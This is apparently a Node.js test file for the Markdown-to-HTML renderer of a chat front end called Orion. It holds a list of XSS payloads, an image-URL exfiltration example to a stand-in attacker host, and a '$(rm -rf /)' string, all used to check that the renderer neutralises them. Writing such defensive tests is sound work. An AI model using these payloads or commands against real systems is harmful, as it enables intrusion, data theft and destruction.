// node --test "tests/front/*.test.js"   (sem dependências)
const test = require('node:test');
const assert = require('node:assert/strict');
const MD = require('../../Orion_Core/Front_end_Orion/js/md.js');
const { renderizar, inline, realcar, escapar, criarRenderStreaming, paraFala } = MD;

const TAGS_OK = new Set(['p', 'br', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li', 'img', 'span', 'a', 'div', 'button',
                         'table', 'thead', 'tbody', 'tr', 'th', 'td', 'blockquote', 'hr']);
const ATRIBUTOS_OK = new Set(['class', 'src', 'alt', 'loading', 'decoding', 'href', 'target', 'rel', 'title', 'data-lang',
                              'role', 'aria-level', 'aria-label', 'aria-hidden', 'type', 'tabindex', 'style', 'start']);

/** Toda `<` da saída abre/fecha tag da lista; só atributos conhecidos; nenhum handler de evento nem URL perigosa. */
function assertSeguro(html) {
    for (const m of html.matchAll(/<(\/?)([a-zA-Z][a-zA-Z0-9]*)((?:\s+[a-zA-Z-]+(?:="[^"<>]*")?)*)\s*\/?>/g)) {
        assert.ok(TAGS_OK.has(m[2].toLowerCase()), `tag inesperada: ${m[0]}`);
        for (const a of m[3].matchAll(/\s+([a-zA-Z-]+)(?:="([^"]*)")?/g)) {
            assert.ok(ATRIBUTOS_OK.has(a[1]), `atributo inesperado ${a[1]} em ${m[0]}`);
            assert.doesNotMatch(a[1], /^on/i);
            if (a[1] === 'href' || a[1] === 'src') assert.match(a[2], /^(?:https?:\/\/|mailto:)/i, `URL fora da lista: ${a[2]}`);
            if (a[1] === 'style') assert.match(a[2], /^text-align:(?:left|right|center)$/);
        }
    }
    const tags = (html.match(/<\/?[a-zA-Z][^<>]*>/g) || []).length;
    assert.equal((html.match(/</g) || []).length, tags, `'<' solto em: ${html}`);
}

test('escapa & < > " \' antes de formatar', () => {
    assert.equal(escapar(`<a href="x" onclick='y'>&`), '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;');
});

const ATAQUES = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    '![x" onerror="alert(1)](https://evil.example/a.png)',
    '![x](https://evil.example/a.png" onerror="alert(1))',
    '![x](javascript:alert(1))',
    '[clique](javascript:alert(1))',
    '[clique](JaVaScRiPt:alert(1))',
    '[clique](data:text/html,<script>alert(1)</script>)',
    '[clique](https://x.com" onclick="alert(1))',
    '[a](https://x.com/"><script>alert(1)</script>)',
    '[<img src=x onerror=alert(1)>](https://x.com)',
    '**<b onmouseover=alert(1)>x</b>**',
    '`<img src=x onerror=alert(1)>`',
    '```html\n<script>alert(1)</script>\n```',
    '```"><img src=x onerror=alert(1)>\ncodigo\n```',
    '- <iframe src=javascript:alert(1)>',
    '# <img src=x onerror=alert(1)>',
    '> <img src=x onerror=alert(1)>',
    '| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | y |',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '0 <script>alert(1)</script>',
    'https://x.com/<script>alert(1)</script>',
    '<https://x.com">',
];

for (const ataque of ATAQUES) {
    test(`HTML injetado não sobrevive: ${ataque.slice(0, 44).replace(/\n/g, '\\n')}`, () => {
        const html = renderizar(ataque);
        assertSeguro(html);
        assert.doesNotMatch(html, /<(script|iframe|svg|b|style)\b/i);
    });
}

test('exfiltração por imagem: URL de outro host vira texto, nunca <img>', () => {
    const html = renderizar('![resumo](https://atacante.example/c.png?d=SEGREDO-DO-USUARIO)');
    assert.doesNotMatch(html, /<img/);
    assert.match(html, /imagem externa bloqueada: resumo/);
    assert.doesNotMatch(html, /atacante|SEGREDO/);
});

test('imagem gerada pelo próprio Orion continua aparecendo', () => {
    for (const host of ['127.0.0.1', 'localhost']) {
        const html = renderizar(`veja ![gato](http://${host}:8000/imagens/img_170.jpg)`);
        assert.match(html, /<img src="http:\/\/[^"]+:8000\/imagens\/img_170\.jpg" alt="gato" class="msg-img"/);
    }
});

test('imagem local só vale se for um nome de arquivo em /imagens/', () => {
    const ruins = [
        'http://127.0.0.1:8000/imagens/../historico', 'http://127.0.0.1:8000/imagens/a/b.png',
        'http://127.0.0.1:8000/imagens/%2e%2e/historico', 'http://127.0.0.1:8000/imagens/a.png?x=1',
        'http://127.0.0.1:8000/exportar', 'http://127.0.0.1:8001/imagens/a.png',
        'http://127.0.0.1:8000.evil.example/imagens/a.png', 'http://127.0.0.1@evil.example:8000/imagens/a.png',
        'https://127.0.0.1:8000/imagens/a.png',
    ];
    for (const url of ruins) assert.doesNotMatch(renderizar(`![x](${url})`), /<img/, url);
});

test('a base das imagens é configurável (modo web, outra origem)', () => {
    MD.configurar({ basesImagens: ['https://orion.tailnet.ts.net/imagens/'] });
    try {
        assert.match(renderizar('![x](https://orion.tailnet.ts.net/imagens/a.png)'), /<img/);
        assert.doesNotMatch(renderizar('![x](http://127.0.0.1:8000/imagens/a.png)'), /<img/);
    } finally {
        MD.configurar({ basesImagens: ['http://127.0.0.1:8000/imagens/', 'http://localhost:8000/imagens/'] });
    }
});

test('links: só http(s)/mailto, rel seguro, host visível quando o texto engana', () => {
    const ok = renderizar('[a documentação](https://sqlite.org/fts5.html)');
    assert.match(ok, /<a class="md-link" href="https:\/\/sqlite\.org\/fts5\.html" target="_blank" rel="noopener noreferrer nofollow"/);
    assert.match(ok, /<span class="md-host" aria-hidden="true">sqlite\.org<\/span>/);
    const honesto = renderizar('[sqlite.org](https://sqlite.org/)');
    assert.doesNotMatch(honesto, /md-host/);                     // texto já mostra o host
    const mentiroso = renderizar('[github.com/orion](https://evil.example/x)');
    assert.match(mentiroso, /md-host[^>]*>evil\.example</);       // texto diz github, destino é outro
    assert.doesNotMatch(renderizar('[x](javascript:alert(1))'), /<a /);
    assert.match(renderizar('[x](mailto:a@b.com)'), /href="mailto:a@b\.com"/);
});

test('URL solta vira link sem engolir a pontuação nem quebrar com _ e *', () => {
    const h = renderizar('Veja https://exemplo.com/a_b_c*d. Depois (https://x.com/p_q) fim.');
    assert.match(h, /href="https:\/\/exemplo\.com\/a_b_c\*d"/);
    assert.match(h, /href="https:\/\/x\.com\/p_q"/);
    assert.doesNotMatch(h, /<em>/);
});

test('formatação inline: negrito, itálico, tachado, código, escape', () => {
    assert.equal(inline('**a** *b* ~~c~~ `d`'), '<strong>a</strong> <em>b</em> <del>c</del> <code>d</code>');
    assert.equal(inline('snake_case_name e 2*3*4'), 'snake_case_name e 2*3*4');
    assert.equal(inline('\\*não é itálico\\*'), '&#42;não é itálico&#42;');
    assert.equal(inline('`**não negrito**`'), '<code>**não negrito**</code>');
    assert.equal(inline('``a ` b``'), '<code>a ` b</code>');
});

test('títulos viram role=heading de nível fixo (3): nunca pulam nível sob o <h2> da tela de chat', () => {
    const h = renderizar('# Um\n\n### Três');
    assert.match(h, /<div class="md-h md-h1" role="heading" aria-level="3">Um<\/div>/);
    assert.match(h, /<div class="md-h md-h3" role="heading" aria-level="3">Três<\/div>/);   // o tamanho segue o nível do texto
});

test('listas: aninhadas, ordenadas com início, tarefas, itens apertados sem <p>', () => {
    const h = renderizar('- a\n  - b\n    - c\n- d\n\n3. três\n4. quatro\n\n- [x] feito\n- [ ] pendente');
    assert.match(h, /<ul><li>a<ul><li>b<ul><li>c<\/li><\/ul><\/li><\/ul><\/li><li>d<\/li><\/ul>/);
    assert.match(h, /<ol start="3"><li>três<\/li><li>quatro<\/li><\/ol>/);
    assert.match(h, /md-check feito" role="img" aria-label="feito"/);
    assert.match(h, /aria-label="pendente"/);
    assertSeguro(h);
});

test('lista com código dentro do item', () => {
    const h = renderizar('1. rode:\n   ```bash\n   ls -la\n   ```\n2. pronto');
    assert.match(h, /<ol><li>rode:<div class="md-code"/);
    assert.match(h, /<\/div><\/li><li>pronto<\/li><\/ol>/);
});

test('tabela com alinhamento, células vazias e | escapado', () => {
    const h = renderizar('| nome | n |\n|:--|--:|\n| a\\|b | 1 |\n| c |');
    assert.match(h, /<th style="text-align:left">nome<\/th><th style="text-align:right">n<\/th>/);
    assert.match(h, /<td style="text-align:left">a\|b<\/td><td style="text-align:right">1<\/td>/);
    assert.match(h, /<td style="text-align:left">c<\/td><td style="text-align:right"><\/td>/);
    assertSeguro(h);
});

test('citação e linha horizontal', () => {
    assert.match(renderizar('> **atenção**\n> segunda linha'), /<blockquote><p><strong>atenção<\/strong><br>segunda linha<\/p><\/blockquote>/);
    assert.match(renderizar('a\n\n---\n\nb'), /<hr>/);
});

test('bloco de código: rótulo, botão copiar, conteúdo escapado, cerca aberta (streaming)', () => {
    const h = renderizar('```py\nprint("<x>")  # oi\n```');
    assert.match(h, /data-lang="python"/);
    assert.match(h, /<span class="md-code-lang">Python<\/span><button type="button" class="md-copy" aria-label="Copiar código">/);
    assert.match(h, /<span class="tk-b">print<\/span>\(<span class="tk-s">&quot;&lt;x&gt;&quot;<\/span>\)/);
    assert.match(h, /<span class="tk-c"># oi<\/span>/);
    const aberto = renderizar('```js\nconst a = 1;');
    assert.match(aberto, /md-code md-code-open/);
    assert.match(aberto, /<span class="tk-k">const<\/span> a = <span class="tk-n">1<\/span>;/);
    assert.match(renderizar('~~~\nsem lingua\n~~~'), /md-code-lang">Código</);
});

test('realce: linguagens e segurança (nenhum caractere do código escapa do escape)', () => {
    assert.match(realcar('SELECT id FROM t WHERE x = \'a\' -- c', 'sql'), /tk-k">SELECT.*tk-s">&#39;a&#39;.*tk-c">-- c/);
    assert.match(realcar('{"a": 1, "b": true}', 'json'), /tk-a">&quot;a&quot;.*tk-n">1.*tk-b">true/);
    assert.match(realcar('Get-ChildItem -Recurse $x # c', 'powershell'), /tk-f">Get-ChildItem.*tk-a">-Recurse.*tk-v">\$x.*tk-c"># c/);
    assert.match(realcar('const a = `x ${y}`;', 'ts'), /tk-s">`x \$\{y\}`/);
    assert.match(realcar('+ novo\n- velho\n@@ -1 +1 @@', 'diff'), /tk-ins.*tk-del.*tk-k/s);
    assert.equal(realcar('<b>&</b>', 'linguagem-desconhecida'), '&lt;b&gt;&amp;&lt;/b&gt;');
    for (const lang of ['python', 'js', 'sql', 'bash', 'powershell', 'json', 'yaml', 'html', 'css', 'ini', 'diff', 'x']) {
        const out = realcar('</span><script>alert("x")</script> \'"` $(rm -rf /) # -- /*', lang);
        assert.doesNotMatch(out, /<script|<\/script/);
        assert.equal((out.match(/</g) || []).length, (out.match(/<\/?span[^<>]*>/g) || []).length, `${lang}: '<' fora de span`);
    }
});

test('realce: código gigante não trava (pula o realce)', () => {
    const grande = 'x = 1\n'.repeat(10000);
    const t0 = Date.now();
    assert.doesNotMatch(realcar(grande, 'python'), /tk-/);
    assert.ok(Date.now() - t0 < 500);
});

test('streaming incremental: o resultado é idêntico ao render completo em QUALQUER corte', () => {
    const texto = '# Plano\n\nPrimeiro **parágrafo**.\n\n```python\nx = 1\n\ny = 2\n```\n\n- a\n- b\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nFim com [link](https://x.com).\n';
    const r = criarRenderStreaming();
    for (let corte = 1; corte <= texto.length; corte++) {
        const parcial = texto.slice(0, corte);
        assert.equal(r.renderizar(parcial), renderizar(parcial), `corte em ${corte}`);
    }
    // texto reescrito (ex.: "refazer") não reaproveita a cabeça antiga
    assert.equal(r.renderizar('outro texto\n\nsegundo'), renderizar('outro texto\n\nsegundo'));
});

test('streaming incremental: linha em branco dentro de cerca de código não fecha o bloco estável', () => {
    assert.equal(MD.pontoEstavel('a\n\n```\nx\n\ny'), 3);          // só depois de "a\n\n"
    assert.equal(MD.pontoEstavel('a\n\n```\nx\n\ny\n```\n\nb'), 'a\n\n```\nx\n\ny\n```\n\n'.length);
});

test('texto para fala: sem código, link vira texto, sem marcação', () => {
    const f = paraFala('## Título\n\nVeja **isto** em [docs](https://x.com) e `ls`.\n```py\nprint(1)\n```\nFim https://x.com');
    assert.equal(f, 'Título Veja isto em docs e . Fim');
});

test('entrada hostil: não lança e não retorna lixo para tipos estranhos', () => {
    for (const x of [null, undefined, 42, '', '\0', '```', '|', '[', '![', '* ', '1.', '> ', '#', '-'.repeat(5000)]) {
        assert.equal(typeof renderizar(x), 'string');
    }
});

test('desempenho: 200 KB de markdown renderiza em tempo razoável', () => {
    const bloco = '## T\n\n- **a** [l](https://x.com) `c`\n- b\n\n```js\nconst a = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n';
    const texto = bloco.repeat(Math.ceil(200000 / bloco.length));
    const t0 = Date.now();
    renderizar(texto);
    assert.ok(Date.now() - t0 < 2500, `demorou ${Date.now() - t0} ms`);
});
